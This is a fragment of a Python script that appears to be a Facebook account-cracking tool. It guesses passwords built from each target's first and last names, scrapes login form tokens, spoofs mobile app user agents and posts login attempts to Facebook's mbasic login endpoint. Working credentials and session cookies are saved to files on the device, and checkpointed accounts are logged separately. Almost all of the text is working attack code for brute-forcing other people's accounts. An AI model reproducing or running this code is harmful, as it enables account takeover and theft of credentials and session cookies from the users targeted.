                                        sys.stdout.write('\r\r\033[1;31m [SHAIKH-M3] %s|\033[1;31mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [SHAIKH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass


def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [SHAIKH-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        ua  =  "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/14.0.0.20.69;FBBV/12945441;FBDM/{density=3.4,width=480,height=800};FBLC/dz_BT;FBCR/GLOMOBILE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/G3502I;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': uaa(), 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Aking=session.cookies.get_dict().keys()
                        if "c_user" in Aking:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [SHAIKH-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SHAIKH-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/SHAIKH-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAIKH-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:pass
        loop+=1



try:
	menu()
except requests.exceptions.ConnectionError:
	print('\n No internet connection ...')
	exit()
except:exit()
